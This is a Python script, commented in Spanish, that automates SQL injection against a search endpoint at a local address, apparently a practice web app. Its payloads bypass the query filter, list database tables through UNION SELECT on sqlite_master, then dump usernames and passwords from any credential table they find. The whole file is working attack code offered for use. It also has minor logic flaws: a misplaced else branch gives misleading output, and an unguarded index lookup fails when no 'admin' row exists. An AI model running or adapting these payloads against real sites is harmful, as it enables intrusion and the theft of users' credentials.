import requests
from bs4 import BeautifulSoup

# Configuración
TARGET_URL = "http://127.0.0.1:5000/search"
PARAM_NAME = "q"

def scan_sql_injection():
    # Payloads diseñados para extraer datos visibles
    payloads = {
    	"Prueba clásica de bypass":"' OR '1'='1",
        "Enumeración de Tablas": "' UNION SELECT 1, name, 3, 4 FROM sqlite_master WHERE type='table'; --",
        "Extracción de Usuarios": "' UNION SELECT username, password, id, '" 
    }
    payloads_credenciales ={}
    tablas_credenciales = ["users","usuarios","credenciales"]
    tablas_encontradas = []

    print(f"[*] Iniciando escaneo avanzado en: {TARGET_URL}\n")

    for nombre_prueba, payload in payloads.items():
        params = {PARAM_NAME: payload}
        try:
            if len(tablas_encontradas) == 0:
               response = requests.get(TARGET_URL, params=params)                             
               response.raise_for_status() # Lanza error si el status no es 200

               # Parseamos el contenido HTML
               soup = BeautifulSoup(response.text, 'html.parser')
            
               # Buscamos la tabla específica de resultados
               table = soup.find("table", class_="data-table")
            
               if table:
                  # Extraemos todo el texto de las celdas (td) de la tabla
                  cells_text = [td.get_text().strip() for td in table.find_all("td")]
                
                  # Análisis de resultados
                  if nombre_prueba == "Prueba clásica de bypass" :
                     print(f"    Payload: {payload}\n")                  
                     print(f"[!] CRÍTICO: Resultado positivo. Admite SQL injectión.\n")
                     print("	Evidencia:")
                     print(f"    Datos extraídos de la tabla: {cells_text[-16:]}...\n") # Muestra los ultimos resultados                     
                  elif nombre_prueba == "Enumeración de Tablas" :                	
                     for nombre_tabla in tablas_credenciales :
                         if nombre_tabla in cells_text:
                            tablas_encontradas.append(nombre_tabla)
                            print(f"	Payload: {payload}\n")                            
                            print(f"[!] CRÍTICO: Vulnerabilidad confirmada en '{nombre_prueba}'")
                            print(f"	Evidencia: Se encontró la tabla de credenciales {nombre_tabla} extraida del modelo de datos, dentro de la tabla HTML.\n")

            elif nombre_prueba == "Extracción de Usuarios" and len(tablas_encontradas) > 0:
                    # Si detectamos nombres comunes o patrones de contraseñas (hashes o texto)
                    # Aquí podrías buscar usuarios conocidos como 'admin'
                 for encontrada in tablas_encontradas:
                    
                     params = {PARAM_NAME: payload+encontrada+"' FROM "+encontrada+";--"}
                     
                     response = requests.get(TARGET_URL, params=params)                            
                     response.raise_for_status() # Lanza error si el status no es 200
                     # Parseamos el contenido HTML
                     soup = BeautifulSoup(response.text, 'html.parser')
                     # Buscamos la tabla específica de resultados
                     table = soup.find("table", class_="data-table")
                     
                     if table:
                        # Extraemos todo el texto de las celdas (td) de la tabla
                        cells_text = [td.get_text().strip() for td in table.find_all("td")]
                  
                        if len(cells_text) > 0:
                        	print(f"    Payload: {payload+encontrada+"' FROM "+encontrada+";--"}\n")
                        	print(f"[!] CRÍTICO: Fuga de datos detectada en '{nombre_prueba}'")
                        	print(f"Tabla {encontrada}")
                        	print("	Evidencia:")
                        	print(f"    Datos extraídos de la tabla: {cells_text[cells_text.index('admin'):]}...") # Muestra los ultimos resultados

            else:
                print(f"[-] Prueba '{nombre_prueba}': No se encontró la tabla 'data-table'. El payload no inyectó datos o la página cambió.")

        except Exception as e:
            print(f"[X] Error durante la prueba {nombre_prueba}: {e}")

if __name__ == "__main__":
    scan_sql_injection()